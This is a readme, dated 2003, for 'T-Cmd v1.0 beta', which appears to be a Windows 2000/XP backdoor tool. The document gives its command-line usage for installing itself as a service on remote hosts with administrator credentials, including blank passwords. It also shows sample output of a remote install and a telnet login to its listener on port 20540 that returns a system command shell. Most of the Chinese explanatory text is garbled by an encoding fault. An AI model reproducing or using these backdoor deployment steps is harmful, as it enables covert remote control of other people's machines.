��������������������������������������
������ľ����������߷��� ·������   ��
��  ��վÿ�����   �ڿ�ľ����     ��
��     http://soft.98959.com        ��
��������������������������������������
T-Cmd v1.0 beta

Author: TOo2y
E-mail: TOo2y@safechina.net
HomePage: www.safechina.net
Date: 02-05-2003

1>��ؼ�飺

    �Զ�ΪԶ��/���������������񼶺��ţ�����ʹ���κζ�������֧�ֱ���/Զ��ģʽ�������󣬳�����Ȼ�Զ����С������˿�20540/tcp��

    Զ�̰�װ/ж��ʱ�����ṩ����ԱȨ��(Admin)���û��������룬������Ϊ�գ�����"NULL"���档

    ��Ӧƽ̨��Windows2000/XP��

    ����ע�⣬�κ�ʹ�ñ��������Ƿ���;����غ�����뱾���޹ء�

    ԭ�������μ���ǳ��Windows2000/XP��������ż�������


2>���ؼ�Զ�̰�װ/ж��ʵ����

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Help

                ---[ T-Cmd v1.0 beta, by TOo2y   ]---
                ---[ E-mail: TOo2y@safechina.net ]---
                ---[ HomePage: www.safechina.net ]---
                ---[ Date: 02-05-2003            ]---

Attention:
  Be careful with this software, Good luck !

Usage Show:
  T-Cmd  -Help
  T-Cmd  -Install  [RemoteHost]  [Account]  [Password]
  T-Cmd  -Remove   [RemoteHost]  [Account]  [Password]

Example:
  T-Cmd  -Install  (Install in the localhost)
  T-Cmd  -Remove   (Remove  in the localhost)
  T-Cmd  -Install  192.168.0.1  TOo2y  123456  (Install in 192.168.0.1)
  T-Cmd  -Remove   192.168.0.1  TOo2y  123456  (Remove  in 192.168.0.1)
  T-Cmd  -Install  192.168.0.2  TOo2y  NULL    (NULL instead of no password)


D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Install
Transmitting File ... Success !
Creating Service .... Success !
Starting Service .... Pending ... Success !

D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Remove
Stopping Service .... Pending ... Success !
Removing Service .... Success !
Removing File ....... Success !

D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Install 192.168.0.1 Administrator NULL
Now Connecting ...... Success !
Transmitting File ... Success !
Creating Service .... Success !
Starting Service .... Pending ... Success !
Now Disconnecting ... Success !

D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Remove 192.168.0.1 Administrator NULL
Now Connecting ...... Success !
Stopping Service .... Pending ... Success !
Removing Service .... Success !
Removing File ....... Success !
Now Disconnecting ... Success !


3>��¼ʵ����

D:\MPJ\CUI\T-Cmd\Debug>Telnet 192.168.0.1 20540


                ---[ T-Cmd v1.0 beta, by TOo2y   ]---
                ---[ E-mail: TOo2y@safechina.net ]---
                ---[ HomePage: www.safechina.net ]---
                ---[ Date: 02-05-2003            ]---


Escape Character is 'CTRL+]'

Microsoft Windows 2000 [Version 5.00.2195]
(C) ��Ȩ���� 1985-1998 Microsoft Corp.

C:\WINNT\system32>